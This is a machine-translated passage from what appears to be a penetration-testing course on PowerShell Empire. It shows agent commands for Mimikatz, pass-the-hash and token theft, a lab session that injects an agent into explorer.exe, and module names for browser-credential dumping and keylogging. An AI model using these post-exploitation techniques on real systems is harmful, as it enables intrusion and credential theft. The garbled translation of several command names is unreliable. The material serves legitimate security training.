<div style="position:absolute;top:135147;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">返回主菜单。</font></font></nobr></div>
<div style="position:absolute;top:135163;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">模仿    </font></font></nobr></div>
<div style="position:absolute;top:135163;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在客户端上运行 Invoke-Mimikatz。</font></font></nobr></div>
<div style="position:absolute;top:135180;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">注射    </font></font></nobr></div>
<div style="position:absolute;top:135180;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将启动器注入远程进程。</font><font style="vertical-align: inherit;">前任。</font><font style="vertical-align: inherit;">psinject &lt;监听器&gt; &lt;pi</font></font></nobr></div>
<div style="position:absolute;top:135197;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第    </font></font></nobr></div>
<div style="position:absolute;top:135197;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过 Mimikatz 为 CredID 执行 PTH。</font></font></nobr></div>
<div style="position:absolute;top:135214;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">改名    </font></font></nobr></div>
<div style="position:absolute;top:135214;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">重命名代理。</font></font></nobr></div>
<div style="position:absolute;top:135231;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">资源    </font></font></nobr></div>
<div style="position:absolute;top:135231;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从文件中读取并执行 Empire 命令列表。</font></font></nobr></div>
<div style="position:absolute;top:135248;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">自我介绍    </font></font></nobr></div>
<div style="position:absolute;top:135248;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用凭据/令牌恢复令牌权限。</font></font></nobr></div>
<div style="position:absolute;top:135265;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sc    </font></font></nobr></div>
<div style="position:absolute;top:135265;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">截屏，默认为PNG。</font><font style="vertical-align: inherit;">给出一个比率意味着使用 JPEG。</font></font></nobr></div>
<div style="position:absolute;top:135282;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">脚本命令    </font></font></nobr></div>
<div style="position:absolute;top:135282;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在当前导入的 PowerShell 脚本中执行一个函数。</font></font></nobr></div>
<div style="position:absolute;top:135299;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">scriptimport 导入 PowerShell 脚本并将其保存在代理的内存中。</font></font></nobr></div>
<div style="position:absolute;top:135316;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">searchmodule Search Empire 模块名称/描述。</font></font></nobr></div>
<div style="position:absolute;top:135333;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">壳    </font></font></nobr></div>
<div style="position:absolute;top:135333;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要求代理使用 shell 命令。</font></font></nobr></div>
<div style="position:absolute;top:135350;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">睡觉    </font></font></nobr></div>
<div style="position:absolute;top:135350;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">任务代理“睡眠间隔[抖动]”</font></font></nobr></div>
<div style="position:absolute;top:135367;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">产卵    </font></font></nobr></div>
<div style="position:absolute;top:135367;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为给定的侦听器名称生成一个新的 Empire 代理。</font><font style="vertical-align: inherit;">前任。</font><font style="vertical-align: inherit;">生成 &lt;li</font></font></nobr></div>
<div style="position:absolute;top:135384;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">steal_token 使用凭证/令牌模拟给定进程的令牌 I</font></font></nobr></div>
<div style="position:absolute;top:135401;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">系统信息    </font></font></nobr></div>
<div style="position:absolute;top:135401;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">委托代理获取系统信息。</font></font></nobr></div>
<div style="position:absolute;top:135418;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">updateprofile 更新代理连接配置文件。</font></font></nobr></div>
<div style="position:absolute;top:135435;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">上传    </font></font></nobr></div>
<div style="position:absolute;top:135435;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">委托代理上传文件。</font></font></nobr></div>
<div style="position:absolute;top:135452;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用模块    </font></font></nobr></div>
<div style="position:absolute;top:135452;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Empire PowerShell 模块。</font></font></nobr></div>
<div style="position:absolute;top:135469;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">workinghours 获取或设置代理的工作时间（9:00-17:00）。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:135607;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="115"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 115 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:135640;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:136717;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:136717;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:136717;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">732</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:135752;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（帝国：S2Y5XW1L）&gt; </font></font></nobr></div>
<div style="position:absolute;top:135772;left:339"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 832 - 执行帮助命令</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:135801;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">与 Meterpreter 有效载荷一样，Empire 允许我们将有效载荷迁移到不同的进程中。</font></font></nobr></div>
<div style="position:absolute;top:135821;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以通过首先使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ps</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">查看所有正在运行的进程</font><font style="vertical-align: inherit;">来做到这一点</font><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">一旦我们选择了目标流程，</font></font></nobr></div>
<div style="position:absolute;top:135840;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">psinject</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令</font><font style="vertical-align: inherit;">迁移有效负载</font><font style="vertical-align: inherit;">，包括侦听器的名称和</font></font></nobr></div>
<div style="position:absolute;top:135860;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">进程 ID 作为我们的命令参数：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:135894;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（帝国：S2Y5XW1L）&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ps</font></font></font></b></nobr></div>
<div style="position:absolute;top:135911;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">进程名    </font></font></nobr></div>
<div style="position:absolute;top:135911;left:295"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PID Arch 用户名 MemUsage </font></font></nobr></div>
<div style="position:absolute;top:135928;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-----------    </font></font></nobr></div>
<div style="position:absolute;top:135928;left:295"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">--- ---- -------- -------- </font></font></nobr></div>
<div style="position:absolute;top:135945;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">空闲    </font></font></nobr></div>
<div style="position:absolute;top:135945;left:311"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0 x86 不适用    </font></font></nobr></div>
<div style="position:absolute;top:135945;left:465"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0.00 MB  </font></font></nobr></div>
<div style="position:absolute;top:135962;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">系统    </font></font></nobr></div>
<div style="position:absolute;top:135962;left:311"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4 x86 不适用    </font></font></nobr></div>
<div style="position:absolute;top:135962;left:465"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0.00 MB  </font></font></nobr></div>
<div style="position:absolute;top:135979;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">…………</font></font></nobr></div>
<div style="position:absolute;top:135996;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">探险家    </font></font></nobr></div>
<div style="position:absolute;top:135996;left:287"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3568 x86 公司\offsec 3.41 MB  </font></font></nobr></div>
<div style="position:absolute;top:136013;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">虚拟主机    </font></font></nobr></div>
<div style="position:absolute;top:136013;left:287"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3820 x86 公司\offsec 9.18 MB  </font></font></nobr></div>
<div style="position:absolute;top:136030;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">…………</font></font></nobr></div>
<div style="position:absolute;top:136064;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（帝国：S2Y5XW1L）&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">psinject http 3568</font></font></font></b></nobr></div>
<div style="position:absolute;top:136081;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 委托 U9M3SBHG 运行 TASK_CMD_JOB</font></font></nobr></div>
<div style="position:absolute;top:136098;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 特工 U9M3SBHG 的任务是任务 ID 4</font></font></nobr></div>
<div style="position:absolute;top:136115;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 委托代理 U9M3SBHG 运行模块 powershell/management/psinject</font></font></nobr></div>
<div style="position:absolute;top:136132;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">工作开始：BCMWAV</font></font></nobr></div>
<div style="position:absolute;top:136149;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 特工 U9M3SBHG 返回结果</font></font></nobr></div>
<div style="position:absolute;top:136166;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 将 POWERSHELL stager（阶段 1）发送到 10.11.0.22</font></font></nobr></div>
<div style="position:absolute;top:136183;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 新代理 DWZ49BAP 签入</font></font></nobr></div>
<div style="position:absolute;top:136200;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[+] 10.11.0.22 的初始代理 DWZ49BAP 现在处于活动状态（Slack）</font></font></nobr></div>
<div style="position:absolute;top:136217;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 在 10.11.0.22 将代理（阶段 2）发送到 DWZ49BAP //--&gt;</font></font></nobr></div>
<div style="position:absolute;top:136234;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（帝国：S2Y5XW1L）&gt; </font></font></nobr></div>
<div style="position:absolute;top:136253;left:313"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 833 - 注入 explorer.exe 进程</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:136282;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">需要注意的是，与 Meterpreter 有效负载的迁移功能不同，一旦</font></font></nobr></div>
<div style="position:absolute;top:136302;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">流程迁移完成，原Empire agent保持活动状态，我们必须手动</font></font></nobr></div>
<div style="position:absolute;top:136321;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">切换到新创建的代理，如下图：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:136356;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(帝国：DWZ49BAP) &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">特工</font></font></font></b></nobr></div>
<div style="position:absolute;top:136390;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 活跃代理：</font></font></nobr></div>
<div style="position:absolute;top:136424;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Name Lang 内部 IP 机器名 Username 进程    </font></font></nobr></div>
<div style="position:absolute;top:136424;left:733"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">延迟</font></font></nobr></div>
<div style="position:absolute;top:136441;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">--------- ---- ----------- ------------ --------- ----- ——    </font></font></nobr></div>
<div style="position:absolute;top:136441;left:733"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-----</font></font></nobr></div>
<div style="position:absolute;top:136458;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">S2Y5XW1L ps 10.11.0.22 CLIENT251 corp\offsec powershell/2976 5/0.0</font></font></nobr></div>
<div style="position:absolute;top:136475;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">DWZ49BAP ps 10.11.0.22 CLIENT251 corp\offsec explorer/3568 5/0.0</font></font></nobr></div>
<div style="position:absolute;top:136509;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（帝国：特工）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">互动 DWZ49BAP</font></font></font></b></nobr></div>
<div style="position:absolute;top:136526;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（帝国：DWZ49BAP）&gt; </font></font></nobr></div>
<div style="position:absolute;top:136545;left:345"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 834 - 切换到新代理</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:136576;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">23.1.3.1 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:136610;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在我们已经了解了 PowerShell Empire 的基本功能，请尝试以下练习</font></font></nobr></div>
<div style="position:absolute;top:136630;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">你自己来巩固你的知识。</font></font></nobr></div>
<div style="position:absolute;top:136663;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 在你的 Kali 系统上安装并启动 PowerShell Empire。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:136795;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="116"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 116 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:136828;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:137905;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:137905;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:137905;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">733</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:136924;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. 在你的 Kali 机器上创建一个 PowerShell Empire 监听器并在你的机器上执行一个 stager</font></font></nobr></div>
<div style="position:absolute;top:136943;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows 10 客户端。</font></font></nobr></div>
<div style="position:absolute;top:136971;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3. 试用 PowerShell Empire 代理及其基本功能。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:137009;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">23.2 PowerShell 模块</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:137050;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Empire 代理的强大之处在于框架提供的各种模块。</font><font style="vertical-align: inherit;">我们可以列出所有</font></font></nobr></div>
<div style="position:absolute;top:137070;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过运行</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">usemodule</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">后跟</font></font><font style="font-size:36px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">T</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和双</font></font><font style="font-size:36px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">A 来</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">获得可用模块</font><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:137105;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(帝国: S2Y5XW1L) &gt; 使用</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">模块</font></font></font></b></nobr></div>
<div style="position:absolute;top:137122;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">显示所有 204 种可能性？</font><font style="vertical-align: inherit;">(y 或 n)</font></font></nobr></div>
<div style="position:absolute;top:137138;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">code_execution/invoke_dllinjection</font></font></nobr></div>
<div style="position:absolute;top:137156;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">code_execution/invoke_metasploitpayload</font></font></nobr></div>
<div style="position:absolute;top:137173;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">code_execution/invoke_ntsd</font></font></nobr></div>
<div style="position:absolute;top:137190;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">code_execution/invoke_reflectivepeinjection</font></font></nobr></div>
<div style="position:absolute;top:137206;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">code_execution/invoke_shellcode</font></font></nobr></div>
<div style="position:absolute;top:137223;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">code_execution/invoke_shellcodemsil</font></font></nobr></div>
<div style="position:absolute;top:137240;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">收集/ChromeDump</font></font></nobr></div>
<div style="position:absolute;top:137257;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">收集/FoxDump</font></font></nobr></div>
<div style="position:absolute;top:137275;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">收藏/USBKeylogger*</font></font></nobr></div>
<div style="position:absolute;top:137291;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">收藏/网络摄像头记录器</font></font></nobr></div>
<div style="position:absolute;top:137308;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">集合/浏览器数据</font></font></nobr></div>
<div style="position:absolute;top:137325;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:137344;left:307"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 835 - PowerShell Empire 中的可用模块</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:137374;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这些模块分为多个类别，但也包括基本功能，例如</font></font></nobr></div>
<div style="position:absolute;top:137394;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">键盘记录、屏幕截图和文件下载。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:137428;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">23.2.1</font></font></i></nobr></div>
<div style="position:absolute;top:137428;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对情况的意识</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:137466;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们来看看几个模块，看看它们是由什么组成的。</font><font style="vertical-align: inherit;">我们将针对专门的 Active</font></font></nobr></div>
<div style="position:absolute;top:137485;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">本节中的目录实验室环境。</font></font></nobr></div>
<div style="position:absolute;top:137518;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">首先，让我们探索一下</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">情景</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">意识类别。</font><font style="vertical-align: inherit;">虽然方法很多，</font></font></nobr></div>
<div style="position:absolute;top:137537;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用于执行网络枚举的命令，此类别的主要重点是本地</font></font></nobr></div>
<div style="position:absolute;top:137557;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">客户端和 Active Directory 枚举。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:137983;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="117"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 117 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:138016;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:139093;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:139093;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:139093;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">734</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:138106;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">23.2.1.1.1</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:138156;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Active Directory 枚举模块位于网络子目录中</font></font></i></nobr></div>
<div style="position:absolute;top:138175;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以 PowerView 为前缀的类别。</font><font style="vertical-align: inherit;">这是对@harmj0y 原文的引用</font></font></i></nobr></div>
<div style="position:absolute;top:138195;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Veil-PowerView </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">724</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">项目。</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:138257;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">例如，我们可以使用 get_user 模块，然后发出</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">info</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令来显示</font></font></nobr></div>
<div style="position:absolute;top:138276;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有关模块的信息（清单 836）。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:138338;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请密切注意此示例中的语法。</font><font style="vertical-align: inherit;">要从模块中选择</font></font></i></nobr></div>
<div style="position:absolute;top:138358;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">“empire base prompt”，我们包含了模块的完整路径。</font><font style="vertical-align: inherit;">如果我们不在</font></font></i></nobr></div>
<div style="position:absolute;top:138377;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在这个基本提示中，我们会在模块路径前面加上 powershell/。</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:138441;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(Empire:2Y5XW1L) &gt; 使用</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">模块情景意识/网络/powerview/get_user</font></font></font></b></nobr></div>
<div style="position:absolute;top:138475;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(powershell/situational_awareness/network/powerview/get_user) &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">信息</font></font></font></b></nobr></div>
<div style="position:absolute;top:138509;left:222"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">名称：Get-DomainUser</font></font></nobr></div>
<div style="position:absolute;top:138526;left:206"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">模块：powershell/situational_awareness/network/powerview/get_user</font></font></nobr></div>
<div style="position:absolute;top:138543;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NeedsAdmin：错误</font></font></nobr></div>
<div style="position:absolute;top:138560;left:182"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">OpsecSafe：真</font></font></nobr></div>
<div style="position:absolute;top:138577;left:190"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">语言：powershell</font></font></nobr></div>
<div style="position:absolute;top:138594;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最小语言版本：2</font></font></nobr></div>
<div style="position:absolute;top:138611;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">背景：真实</font></font></nobr></div>
<div style="position:absolute;top:138628;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">输出扩展：无</font></font></nobr></div>
<div style="position:absolute;top:138662;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">作者：</font></font></nobr></div>
<div style="position:absolute;top:138679;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">@harmj0y</font></font></nobr></div>
<div style="position:absolute;top:138713;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">描述：</font></font></nobr></div>
